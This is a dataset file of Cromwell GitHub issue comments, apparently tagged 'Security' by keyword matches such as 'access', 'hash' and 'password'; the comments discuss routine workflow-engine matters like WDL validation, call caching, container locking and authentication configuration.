Security,"Hey @aednichols, I tested this to make sure, and as expected, running the test with `version 1.0` fails with errors:. ```; Failed to read task definition at line 3 column 6 (reason 1 of 1): Failed to read outputs section (reason 1 of 1): Failed to read declaration (reason 1 of 1): Failed to parse expression (reason 1 of 1): Unknown engine function: 'sep'; Failed to read task definition at line 13 column 6 (reason 1 of 1): Failed to parse expression (reason 1 of 1): Unknown engine function: 'sep'; ```. I've fixed the corresponding tests in https://github.com/broadinstitute/cromwell/pull/5494/commits/40851b7423de68bda7ff9aaa47a37fbf7a0a70a3. So this should still be good to merge!. Edit: I see the test is failing, but looks like an unrelated error:. ```; [error] java.lang.RuntimeException: The vault token file ""/home/travis/.vault-token"" does not exist. Be sure to login using the instructions on https://hub.docker.com/r/broadinstitute/dsde-toolbox/ under ""Authenticating to vault"".; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5494#issuecomment-654019247:967,Authenticat,Authenticating,967,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5494#issuecomment-654019247,1,['Authenticat'],['Authenticating']
Security,"Hey @benjamincarlin,. The call caching feature is really designed with the focus on not having to recomputing outputs. In the case of the monitoring script, it really was meant to be treated as a debugging tool and not a true output from a task. Can you explain why you need to the monitoring log for cached jobs, especially as its not new information? Is the motivation to be able to access all monitoring logs under one workflow uuid directory?. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-444621805:385,access,access,385,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-444621805,1,['access'],['access']
Security,"Hey @cmarkello, unrelated to your initial problem, but how do you find the performance of the file-hash based caching for Cromwell? We've found it to be incredibly CPU / memory / network intensive for large (~250GB) input files so looking for alternatives (#5346).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-583216806:99,hash,hash,99,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-583216806,1,['hash'],['hash']
Security,"Hey @gauravs90 - this looks like it shares a bit of work with the stuff I did in my #707 PR, trying to get message processing as far through the system as possible without backends. Luckily, you've focused in a different place (the actual validation) so combining/merging them shouldn't be too tough. The big differences I can see:; - I did the Materialization in a shadow actor to avoid interrupting the main one; - I moved backend assignment into my ShadowMaterializeWorkflowDescriptorActor; - MaterializeWorkflowDescriptorActor creates a data-only EngineWorkflowDescriptor. Literally just a BackendWorkflowDescriptor plus backend assignments. Having looked at your code though, I'm now unsure which is better; - It turned out I wasn't 100% correct first time so there was a lot of tidying up in the interfaces between the lifecycle states :-/ . Anyway, I've added you as a reviewer on my PR so you can have a look at what I've done - it'd be nice to try to work out where these things should go and maybe rebase or merge these PRs since they're making changes in similar places?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/709#issuecomment-210438658:239,validat,validation,239,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/709#issuecomment-210438658,1,['validat'],['validation']
Security,"Hey @jsotobroad sorry if this is a well-known issue but I've been OOO for a couple of days, but why would these changes be made relative to a particular hash and not off develop?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198466801:153,hash,hash,153,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198466801,1,['hash'],['hash']
Security,"Hey @leepc12 it turns out that you do have a bug in your WDL and that Cromwell 29 was at fault for not highlighting it too. I'll submit a PR to include a better error message, which will be along the lines of:; ```; Unable to build WOM node for If '$if_2': Unable to build WOM node for Scatter '$scatter_2': Unable to build WOM node for WdlTaskCall 't3': Invalid indexing target. You cannot index a value of type'Array[Int]?'; ```. Notice that in order to access `t2.out` you're looking up inside another `if` block, which means that the output has to be treated as optional. . - Given the structure of *this* workflow you could move the `if ( b1 && b2 )` inside the `if (b1)` (and simplify the conditional expression). ; - If that's not possible in your real workflow you can use `select_first` to get the value out, eg `call t0 as t3 { input: i=select_first([t2.out])[i] }` (NB this is only valid because `if (b1 && b2)` implies `if (b1)` must have been run, so the `select_first` is known to succeed)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3007#issuecomment-349689182:456,access,access,456,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3007#issuecomment-349689182,2,['access'],['access']
Security,"Hey @rhpvorderman, I've started to use this for our workflows and seems to be working well! Props for this change :). I've got a small suggestion (not enough to raise an issue, and only if you're already making other changes), it would be awesome if Cromwell could log a message to say that it's copying files. I watch for that because then I know the task is starting properly. . Unrelated to that, I was wondering what hurdles might have to be overcome to devise a hashing-strategy based on your new `cached-copy` (that's not File / md5). You've mentioned [before](https://github.com/broadinstitute/cromwell/issues/2620#issuecomment-482565332) that this might be possible as it doesn't depend on the final path.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-507916924:467,hash,hashing-strategy,467,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-507916924,1,['hash'],['hashing-strategy']
Security,"Hey everyone, I did manage to do some testing today (after some discussion with @TMiguelT as well). Some small notes about my setup:. - I'm using Singularity that has the ability to store and run an OCI container to/from a file.; - I have one place `/path/to/containers/*` where I store all my containers.; - I transform the container digest (returned by Cromwell as `${docker}`) to generate a filename and use that to uniquely reference the container (per this PR: #4797). Notes about my (slightly modified) config below:. - My `$image` var has slashes in it (because it's a path to a file) which isn't correct, as `flock` expects a valid path, so I've just used `$docker_subbed` which is the transformed docker file.; - I didn't have write permission to `/var/lock/$imagename`, I've opted instead for the container directory.; - I wanted the output of `flock` to be redirected to Cromwell's `stderr.submit`.; - I do the second image check for when the lock is released, the locked processes will find the image and skip the pull (per @rherban's [comment](https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509677104)); ```bash; # transformed docker digest; docker_subbed=$(sed -e 's/[^A-Za-z0-9._-]/_/g' <<< ${docker}); # output path of container (.sif); image=/path/to/containers/$docker_subbed.sif; # declare a very similar path (.lock) where Cromwell can access; lockpath=/path/to/containers/$docker_subbed.lock . if [ ! -f ""$image"" ]; then # If we already have the image, skip everything; (; flock --verbose --exclusive 200 1>&2; if [ ! -f ""$image"" ]; then # do a second check once the lock has been released ; singularity pull ""$image"" docker://${docker}; fi; ) 200>/var/lock/$lockpath; fi; ```. Hope this helps!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-517123637:1377,access,access,1377,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-517123637,1,['access'],['access']
Security,"Hi -- I know this is an old issue, but has there been any further discussion on how to mount persistent disks? We're using PAPIv2 as the backend, and we'd like to expose reference databases (stored as filesystems) to our docker containers via a mounted volume.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2190#issuecomment-477680950:163,expose,expose,163,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2190#issuecomment-477680950,1,['expose'],['expose']
Security,"Hi @AlekseiLitkovetc,. > I would like to know which two tests should pass with non-default credentials. Back in March when I filed the ticket we were only [including tests for four](https://github.com/broadinstitute/cromwell/blob/38/src/ci/bin/testCentaurAws.sh#L24-L27) of our dozens of Centaur tests. After the AWS hackathon, the test coverage expanded to only [exclude a few](https://github.com/broadinstitute/cromwell/blob/39/src/ci/bin/testCentaurAws.sh#L25-L53) remaining tests. So, the original minimum A/C was to see these tests passing with non-default creds:; - [hello](https://github.com/broadinstitute/cromwell/blob/42/centaur/src/main/resources/standardTestCases/hello.test); - [long_cmd](https://github.com/broadinstitute/cromwell/blob/42/centaur/src/main/resources/standardTestCases/long_cmd.test); - [haplotypecaller.aws](https://github.com/broadinstitute/cromwell/blob/42/centaur/src/main/resources/integrationTestCases/haplotypecaller.aws.test); - [singlesample.aws](https://github.com/broadinstitute/cromwell/blob/42/centaur/src/main/resources/integrationTestCases/singlesample.aws.test). > could you please prompt where I can find a link to Jenkins?. Our Jenkins servers are only internally accessible to Broad employees because of Jenkins continued problems with security. Perhaps one day we'll move off Travis to another public CI-as-a-Service that will run tests longer than 180 minutes, such as CircleCI or Google Cloud Build. Then we could migrate all tests to one place.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4740#issuecomment-503831164:1211,access,accessible,1211,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4740#issuecomment-503831164,2,"['access', 'secur']","['accessible', 'security']"
Security,"Hi @Redmar-van-den-Berg, you're correct, there appears to be a bug in our draft-2 parser which is failing to catch this. To answer ""which is correct"", the requirement to wrap values in arrays was not being enforced correctly but it now is. In your example you can do this with the array literal syntax, eg:; ```wdl; call ls {; input: files = [ i ]; }; ```. I have added a test for our WDL 1.0 support which **is** catching this properly, so if you're able to upgrade your workflows from WDL draft-2 to WDL 1.0, then `womtool validate` will give you the correct answer. If not, I'll leave this open as a bug since it certainly *should* be picked up by womtool. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4550#issuecomment-454545219:525,validat,validate,525,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4550#issuecomment-454545219,1,['validat'],['validate']
Security,"Hi @TMiguelT, I worked on relative imports in Cromwell quite recently. The ideas about specifying the ""start point"" within the zip file did come up, but in the end people seemed more interested in relative HTTP imports (which is what I focussed on). I have two potential ideas for you which hopefully don't need Cromwell code changes. Hopefully these will help you - if not let us know!. ## Submit by URL. If you have a new version of Cromwell - since these changes were relatively recent - then you could try submitting the workflow to Cromwell by URL (based on your relative path, I'd guess the github hosted location you want would be https://raw.githubusercontent.com/h3abionet/h3agatk/1.0.1/workflows/GATK/GATK-complete-WES-Workflow-h3abionet.cwl). ## Call into the relatively nested file. If submit by URL is out, you could perhaps make a top level ""wrapper"" workflow which immediately imports and calls `workflows/GATK/GATK-complete-WES-Workflow-h3abionet.cwl`. This should let you access it while keeping it's location relative to the other files in the repo safe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4505#issuecomment-449025212:989,access,access,989,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4505#issuecomment-449025212,1,['access'],['access']
Security,"Hi @cjllanwarne, thanks for the response! Actually, my examples passed validation by `wdltool`, but I justed tested them with the current version of `womtool` and they did not pass the validation, and the errors are meaningful. I think it's safe to dismiss the bug label now.; ```Unable to build WOM node for Scatter '$scatter_0': Unable to build WOM node for WdlTaskCall 'testtask': Cannot build expression for 'Test_optional.testtask.str = strings1[idx]': Invalid indexing target. You cannot index a value of type 'Array[String]?'```. ```Unable to build WOM node for Declaration 'num': Cannot build expression for 'Test_optional.num = length(strings1)': Unexpected arguments to function `length`. `length` takes a parameter of type Array but got: Success(WomOptionalType(WomMaybeEmptyArrayType(WomStringType)))```. ```Unable to build WOM node for Declaration 'string_pair': Cannot build expression for 'Test_optional.string_pair = zip(strings1, strings2)': Unexpected zip parameters: Vector(Success(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))), Success(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))))```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-428632555:71,validat,validation,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-428632555,2,['validat'],['validation']
Security,"Hi @cjllanwarne.; Yes, you correctly understood the problem. We haven't tried this option, because we were fixated on one approach :); In general, your idea should solve the problem. Although I have a suspicion that an AccessDeniedException may be thrown there too. Anyway, I will try to do so and tell you the result.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4586#issuecomment-509830998:219,Access,AccessDeniedException,219,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4586#issuecomment-509830998,1,['Access'],['AccessDeniedException']
Security,"Hi @cpavanrun , thanks for the contribution!. Are you using docker? Not having write permission would mean files could only be removed via root access, as docker is executing these services as root. As such, I think this should be `733`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3721#issuecomment-394391389:144,access,access,144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3721#issuecomment-394391389,1,['access'],['access']
Security,"Hi @dtenenba , we fully appreciate the importance of call caching and are looking into this. can I confirm a few things:. * that this is occurring on different files each run?; * you are seeing it every run of non-trivial size; * You have experienced at least one call-cache success run of any workflow (including a trivial one). This will help me narrow down what is going on. . To be clear, this should be working and we are aware that hashing is not a manual process but a simple value lookup.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457307894:438,hash,hashing,438,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457307894,2,['hash'],['hashing']
Security,"Hi @geoffjentry - ; The changes that I pushed are related to the test of the `validateRunArguments` method. Since I changed him, I had to change the tests. I did not notice this test initially.; This bothers me a bit because I did not expect the behavior of the method to change when processing WDL files. But in the end, now this method just processes the files in the same way as in server mode. Moreover, maybe the new behavior makes sense. For example, `validation.get.workflowUrl` indeed should be `None`, since we are supplying workflow without any `url`.; Just in case, I ran simple WDL workflows and didn't encounter any issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5104#issuecomment-519103366:78,validat,validateRunArguments,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5104#issuecomment-519103366,4,['validat'],"['validateRunArguments', 'validation']"
Security,"Hi @kaushik-work - internally Cromwell access docker APIs directly and is not shelling out to `docker` for a variety of reasons. Our experience has been that various container registries have needed to be individually supported as things like auth differ, and there are sometimes subtle differences between the sites. It'd likely not be much work to provide a generic catch all which would work for most sites on public images. However this isn't a common request so prioritizing that over more frequent requests is difficult. However, if what you're getting at is that SBG is now supporting WDL (or is planning on doing so), presumably we'd start seeing more uses of SBG's container registry showing up in WDLs we see in the wild.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4098#issuecomment-422223991:39,access,access,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4098#issuecomment-422223991,1,['access'],['access']
Security,"Hi @kcibul it's about consolidating all of our various devops-y things into a more unified manner. Ideally we'd like to have the Push To DockerHub wrapped into our Jenkins. @hjfbynara can explain more, but from a strategic point, unifying how we move our Dockers around is a good thing, particularly for security and accountability. You can all meet but we're trying to make our DevOps work more unified. Please find me for this meeting.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1654#issuecomment-259459453:304,secur,security,304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1654#issuecomment-259459453,1,['secur'],['security']
Security,"Hi @kshakir, ; Inadvertently did merge instead of rebase. Hope it's ok.; When building pull request, one of the jobs failed first: https://api.travis-ci.com/v3/job/480472697/log.txt. Tried rerunning. It passed.; Would it be possible to share the internal failed test, I would like to run it locally in my workspace if possible. I can't access the failed test discussions link in your reply.; Thanks much.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-774215286:336,access,access,336,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-774215286,1,['access'],['access']
Security,"Hi @nh13, not from Broad but have you tried turning the [docker-digest lookup off](https://cromwell.readthedocs.io/en/stable/tutorials/Containers/#docker-digests) with the following in your config:. ```; docker.hash-lookup.enabled = false; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5178#issuecomment-541952762:211,hash,hash-lookup,211,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5178#issuecomment-541952762,1,['hash'],['hash-lookup']
Security,"Hi @ruchim !. 1. Do you see anything in your logs that indicate db errors?. No. I see that the SGE job completed (`Status change from Running to Done`). 2. What does your db config look like?; ```; database {; db.url = ""jdbc:mysql://.../${CROMWELL_DB}?useSSL=false&rewriteBatchedStatements=true""; db.user = ...; db.password = ...; db.driver = ""com.mysql.jdbc.Driver""; profile = ""slick.jdbc.MySQLProfile$""; }; ```; backed by a MariaDB instance. 3. When you report the REST endpoint shows the workflow as 'Running', what about the executionStatus key in the metadata? Are some jobs marked as 'Running' as well?. The SGE job reported as running as well. I manually query the database, and I see no changes in the `JOB_STORE_ENTRY` table when the SGE job completes and the corresponding entry appears in the Cromwell logs (although not entirely sure I should see something). 4. Do you see this behavior only with large scatters (10K) or do you see it with smaller scatters as well? Or any other type of workflow shape?. I've only observed this behaviour with large scatters AND a file-of-file-names approach. I don't know exactly what combination of WDL features or what threshold of scatter width triggers it .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-445788979:315,password,password,315,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-445788979,1,['password'],['password']
Security,"Hi @ruchim ,; Thanks for asking.; For example, normally, in the alignment, we need to provide the big fasta files as input.; So, it will download from s3 for each single job.; We have all the reference files in our EFS. For our own usage, we mount the EFS into every job definition. So the batch job can access the EFS directly. They don't need to download every time from S3.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4579#issuecomment-493492027:304,access,access,304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4579#issuecomment-493492027,1,['access'],['access']
Security,"Hi @ruchim!. Regarding our current test setup:; We (Brian O., Alex B. and I) are currently using a very minimal test configuration:. Workflow:; GA4GH md5sum from Dockstore; https://dockstore.org/workflows/github.com/briandoconnor/dockstore-workflow-md5sum/dockstore-wdl-workflow-md5sum:1.4.0. Single File:; Source: UChicago Gen3 Data STAGE crai file; DRS URL: dos://dg.4503/2132c569-06e7-474c-8806-93aa116c5d1c; Size: 1.49mb. I just now ran this test configuration from scratch, starting with a new workspace, and it failed like all the others have:. Error:; ```; Task ga4ghMd5.md5:NA:1 failed. The job was stopped before the command finished. PAPI error code 10. The assigned worker has failed to complete the operation	; ```. Log:; ```; 2019/07/16 20:23:02 Starting container setup.; 2019/07/16 20:23:10 Done container setup.; 2019/07/16 20:23:16 Starting localization.; 2019/07/16 20:23:22 Localizing input dos://dg.4503/2132c569-06e7-474c-8806-93aa116c5d1c -> /cromwell_root/topmed-irc-share/genomes/NWD844894.b38.irc.v1.cram.crai; Compiling (synthetic)/ammonite/predef/interpBridge.sc; ```. The name of this workspace is `mbaumann test md5sum 20190716` and I have shared it with you as Owner, in case you would like to investigate. Regarding successful runs in Commons in 2018:; The last reported success that I am aware of was by Moran Cabi ali (then Broad) in mid-2018, when she did demos of obtaining data from UChicago (Windmill) and UCSC (Boardwalk).; I didn't actually run the workflow myself.; There are still some of the demo workspaces from that time available in Terra, which I can access yet don't have permission to share. I don't know if you can access them or not. One such workspace is:; `Team Calcium July 1 Demo - Boardwalk-Windmill_WS`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5069#issuecomment-511990334:1597,access,access,1597,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5069#issuecomment-511990334,2,['access'],['access']
Security,Hi @vsoch - I'm not sure quite what you're looking for here. There's the [WDL spec](https://github.com/openwdl/wdl/blob/master/versions/1.0/SPEC.md) and one can access programatically generated parsers in [multiple languages](https://github.com/openwdl/wdl/tree/master/versions/1.0/parsers) but at the moment the only option I know of which provide programatic **access** to WDL constructs is [miniwdl](https://github.com/chanzuckerberg/miniwdl) although it's still early days (however I'm sure they'd love support & ideas!). There's the WOM layer which we have in Scala and is what we use to internally generalize both WDL & Cromwell but it's likely not useful for your purposes as you can't directly input WOM. Although if what you're asking is if you were to take a WDL or CWL and export e.g. the WOM graph file you can do that with [womtool](https://cromwell.readthedocs.io/en/develop/WOMtool/). Let me know if this comes even close to answering your question :),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4339#issuecomment-442231730:161,access,access,161,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4339#issuecomment-442231730,2,['access'],['access']
Security,"Hi All, just checking in on this issue, to see if it is still alive. Would love to see ecr supported for hash-lookup.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4171#issuecomment-1332235511:105,hash,hash-lookup,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4171#issuecomment-1332235511,1,['hash'],['hash-lookup']
Security,"Hi ChenYong,. I'm closing this issue here on GitHub as Cromwell [30-16f3632 / 30.2](https://github.com/broadinstitute/cromwell/releases/tag/30.2) seems to run fine against a basic MariaDB 5.5.56. I also tried changing the database initialization script to run with-and-without setting `SET GLOBAL sql_mode = 'ANSI_QUOTES';`. If you're still running into problems, can you please create a post over in the [Ask the WDL team](https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team) forum? There please provide as many logs and configuration files as possible (without passwords) so that your issue may be reproduced. ---. To test Cromwell with MariaDB I combined the following files and ran them from an `issues_3346/` directory with `docker-compose up`. - `issues_3346/compose/cromwell/app-config/application.conf`; - `issues_3346/compose/cromwell/Dockerfile`; - `issues_3346/compose/mysql/init/init_user.sql`; - `issues_3346/docker-compose.yml`. The files are in this archive: [issues_3346.tar.gz](https://github.com/broadinstitute/cromwell/files/2190721/issues_3346.tar.gz). Cromwell started and connected to the db. I was able to browse to `http://localhost:80` and submit a workflow.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3346#issuecomment-404688457:581,password,passwords,581,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3346#issuecomment-404688457,1,['password'],['passwords']
Security,"Hi Kristian,. I understand, but what you're asking is very possible - see my previous discussion here about creating 1 billion simultaneous connections, and anything that is not accessible can be pre-cached via buckets during idle periods (i.e. nightly):. https://github.com/googlegenomics/utils-java/issues/62#issuecomment-220444203. So you should be able to create your own Pipeline implementation very easily via `gloud create`, [VM metadata startup scripts](https://cloud.google.com/deployment-manager/step-by-step-guide/setting-metadata-and-startup-scripts) and/or Dataflow Pipelines, and mimic JES:. https://cloud.google.com/sdk/gcloud/reference/compute/instances/create. https://cloud.google.com/deployment-manager/step-by-step-guide/setting-metadata-and-startup-scripts. https://cloud.google.com/dataflow/pipelines/constructing-your-pipeline#applying-transforms-to-process-pipeline-data. If you look at the JES API, you'll notice most of it mirrors the `gcloud` commands and parameters:. https://www.googleapis.com/discovery/v1/apis/genomics/v1alpha2/rest. Again the concepts to speed up searches on dynamically streaming (processed) analysis results has a foundation via inverted indices, which search engines use all the time - I posted a couple of these here:. https://github.com/ga4gh/schemas/pull/253#issuecomment-97525342. https://github.com/ga4gh/schemas/issues/142#issuecomment-55518571. This way your searches are always fresh and would operate without any delay. Hope it helps,; Paul",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1058#issuecomment-228175605:178,access,accessible,178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1058#issuecomment-228175605,2,['access'],['accessible']
Security,"Hi Sergey,. Most of our Travis builds short-circuit for external contributions due to security issues; the `space` test is still around but Travis does not run it against your fork. . [This](https://github.com/broadinstitute/cromwell/blob/develop/centaur/src/main/resources/standardTestCases/space/space.wdl) is the `space` WDL which you could try running against your changes. The workflow should succeed and have outputs that look like [these metadata expectations](https://github.com/broadinstitute/cromwell/blob/develop/centaur/src/main/resources/standardTestCases/space.test) in the `.test` file. Please let us know if you have any questions. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5110#issuecomment-558350731:86,secur,security,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5110#issuecomment-558350731,1,['secur'],['security']
Security,"Hi, . I downloaded the jar file from the GitHub release page:. > wget https://github.com/broadinstitute/cromwell/releases/download/34/cromwell-34.jar. sha256sum results in the hash mentioned by @Horneth. Actually I have two java versions on my system:. ```; java version ""1.8.0_20""; Java(TM) SE Runtime Environment (build 1.8.0_20-b26); Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode); ```; and. ```; openjdk version ""1.8.0_141""; OpenJDK Runtime Environment (build 1.8.0_141-b16); OpenJDK 64-Bit Server VM (build 25.141-b16, mixed mode); ```. It fails with the first one, however I can launch the server with the openjdk version.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4082#issuecomment-420540300:176,hash,hash,176,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4082#issuecomment-420540300,1,['hash'],['hash']
Security,"Hi, I see you've indeed created a service account and gotten a json file, but I'm not seeing how you're passing it to Cromwell.; Your configuration uses `application_default` as authentication mode, and you are logged in using your personal gmail it seems.; Did you use this json in any way ?. To use the service account in Cromwell you'd want to either; 1 - Recommended) Change your configuration to use the service account instead of application default; You can see how to do that [here](https://cromwell.readthedocs.io/en/develop/backends/Google/); It is slightly outdated, instead of `pem-file` use `json-file` and the path to your json.; 2) You can keep application default and use [`gcloud auth activate-service-account`](https://cloud.google.com/sdk/gcloud/reference/auth/activate-service-account) to authenticate as the service account on your machine. Also could you print the result of `gcloud auth list` ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-392038451:178,authenticat,authentication,178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-392038451,2,['authenticat'],"['authenticate', 'authentication']"
Security,"Hi, we have Cromwell running in docker on a GCP VM, and the service account of the GCP VM has access to the image registry. I don't think we are doing anything else to gain access to the private registry.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356#issuecomment-2132863965:94,access,access,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356#issuecomment-2132863965,2,['access'],['access']
Security,"Hi,; ; I'm experiencing the same problem on AWS Batch. My workflow has 2 subworkflows. Even I don't change any part of my workflow/subworkflow, the caching only works for the first task in subworkflows. The subsequent tasks cannot be recognized by hashing. I guess this is because the subworkflow id is also involved in the task inputs, so it change hash. . Does anyone have any update or workaround for this problem? Thank you in advance.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4699#issuecomment-716072581:248,hash,hashing,248,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4699#issuecomment-716072581,2,['hash'],"['hash', 'hashing']"
Security,"Hmm, this seems a bit odd. The `application_default` authentication should still work with a service account, as long as you set the `$GOOGLE_APPLICATION_CREDENTIALS` variable is set, which @juhawilppu seems to have done here. I had this same issue, where my service account only worked once I used a `scheme = ""service_account""`, but that seems like something is implemented wrongly.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-432526506:53,authenticat,authentication,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-432526506,1,['authenticat'],['authentication']
Security,"Hmm... is this a security flaw? Should people even be allowed to do this (or is this configurable?). Current thinking... it might be ok because if you are running a cromwell with a local docker engine you may very well want to do this. If you are running cromwell with local docker, and allowing someone to run jobs on your server, they could gain access to any file anyway via their jobs. . Thoughts?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/802#issuecomment-217951965:17,secur,security,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/802#issuecomment-217951965,2,"['access', 'secur']","['access', 'security']"
Security,"Honestly I'd really like it if that validation were removed from wdl4s. Even though it ""makes sense"" for it to be there because ""the spec says memory should be formatted like this so we should validate it down at the wdl4s level"". I still would rather change the spec to be a suggestion rather than something that's mandatory so we don't have this one outlier which actually makes the code a lot harder to write. If we do change that now, I'll shed a tear because I have to rebase those changes on my super long lived branch that we were going to get to once PBE was finished.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212551388:36,validat,validation,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212551388,2,['validat'],"['validate', 'validation']"
